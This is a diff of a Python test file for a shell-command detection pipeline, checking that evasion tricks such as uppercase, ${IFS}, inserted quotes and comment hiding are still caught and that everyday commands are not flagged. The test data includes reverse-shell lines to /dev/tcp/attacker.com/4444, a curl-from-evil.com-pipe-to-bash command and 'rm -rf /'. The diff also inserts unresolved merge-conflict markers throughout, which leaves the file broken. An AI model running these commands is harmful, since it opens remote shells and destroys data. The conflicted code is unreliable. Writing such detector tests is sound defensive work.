@@ -5,9 +5,12 @@ Verifies the system is not trivially bypassed via:
 - UPPERCASE evasion
 - Whitespace padding
 - Known false-positive commands that must NOT be flagged malicious
+<<<<<<< HEAD
 - Unicode homoglyph evasion
 - Path traversal variants
 - Eval with benign payload
+=======
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
 
 Run:
     pytest large_test_set/test_05_evasion.py -v
@@ -47,6 +50,10 @@ class TestUppercaseEvasion:
         "bash -I >& /dev/tcp/x/4444 0>&1",
     ])
     def test_uppercase_shell_in_redirect(self, pipeline, cmd):
+<<<<<<< HEAD
+=======
+        # Documents current behavior — uppercase bash in /dev/tcp should still hit
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
         result = pipeline.detect(cmd)
         assert result.classification in ("suspicious", "malicious"), \
             f"Reverse shell bypass via case: {cmd!r}"
@@ -107,6 +114,11 @@ class TestDoubleEncoding:
 # ===========================================================================
 # 5. Known False Positives — MUST be classified as "safe"
 # ===========================================================================
+<<<<<<< HEAD
+=======
+# These are everyday developer/sysadmin commands. If any of these is flagged
+# "malicious", it means a rule is too aggressive.
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
 
 class TestKnownSafeCommandsNotMalicious:
 
@@ -161,12 +173,15 @@ class TestKnownSafeCommandsNotMalicious:
         # Editors / paging
         "nano file.txt",
         "tail -f /var/log/syslog",
+<<<<<<< HEAD
         # Additional from test_10_shell_attacks.sh Section 7
         "df -h",
         "ps aux",
         "uname -a",
         "tar -xzf archive.tar.gz",
         "chmod 644 file.txt",
+=======
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
     ])
     def test_known_safe_not_flagged_malicious(self, pipeline, cmd):
         result = pipeline.detect(cmd)
@@ -200,6 +215,10 @@ class TestAmbiguousCommands:
 # ===========================================================================
 
 class TestCommentInjectionEvasion:
+<<<<<<< HEAD
+=======
+    """Attackers append # to try to hide the malicious tail of a command."""
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
 
     @pytest.mark.parametrize("cmd", [
         "ls # ; rm -rf /",
@@ -207,6 +226,10 @@ class TestCommentInjectionEvasion:
         "pwd # ; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
     ])
     def test_attack_after_comment_marker_still_caught(self, pipeline, cmd):
+<<<<<<< HEAD
+=======
+        # The entire raw string is analyzed, so the malicious part is present
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
         result = pipeline.detect(cmd)
         assert result.classification != "safe", \
             f"Comment injection hid attack (got 'safe'): {cmd!r}"
@@ -217,6 +240,10 @@ class TestCommentInjectionEvasion:
 # ===========================================================================
 
 class TestIFSEvasion:
+<<<<<<< HEAD
+=======
+    """Using ${IFS} in place of spaces to bypass keyword detection."""
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
 
     @pytest.mark.parametrize("cmd", [
         "curl${IFS}http://evil.com${IFS}|${IFS}bash",
@@ -236,6 +263,10 @@ class TestIFSEvasion:
 # ===========================================================================
 
 class TestStringConcatEvasion:
+<<<<<<< HEAD
+=======
+    """Empty quotes inserted mid-keyword (ba''sh) to break string matching."""
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
 
     @pytest.mark.parametrize("cmd", [
         "ba''sh -i >& /dev/tcp/attacker.com/4444 0>&1",
@@ -255,6 +286,10 @@ class TestStringConcatEvasion:
 # ===========================================================================
 
 class TestGrayZoneScoreRange:
+<<<<<<< HEAD
+=======
+    """Genuinely ambiguous commands must score between 0 and 70 (not capped)."""
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
 
     @pytest.mark.parametrize("cmd", [
         "bash -c 'ls -la'",
@@ -265,7 +300,13 @@ class TestGrayZoneScoreRange:
     ])
     def test_gray_zone_score_not_capped_at_zero_or_100(self, pipeline, cmd):
         result = pipeline.detect(cmd)
+<<<<<<< HEAD
         assert 0.0 <= result.risk_score <= 100.0
+=======
+        # Score must be a valid float in [0, 100]
+        assert 0.0 <= result.risk_score <= 100.0
+        # Classification must be one of the three valid values
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
         assert result.classification in ("safe", "suspicious", "malicious")
 
     def test_pure_eval_subshell_not_classified_safe(self, pipeline):
@@ -273,6 +314,7 @@ class TestGrayZoneScoreRange:
         result = pipeline.detect("eval $(cat /tmp/script.sh)")
         assert result.classification in ("suspicious", "malicious"), \
             "eval $(...) must not be classified as safe"
+<<<<<<< HEAD
 
 
 # ===========================================================================
@@ -353,3 +395,5 @@ class TestEvalBenignPayload:
         result = pipeline.detect('eval "date"')
         assert result.classification != "malicious", \
             f"eval of 'date' was classified malicious — false positive"
+=======
+>>>>>>> b44c1caac03b55567dc20f083639aa60ea2eb3f1
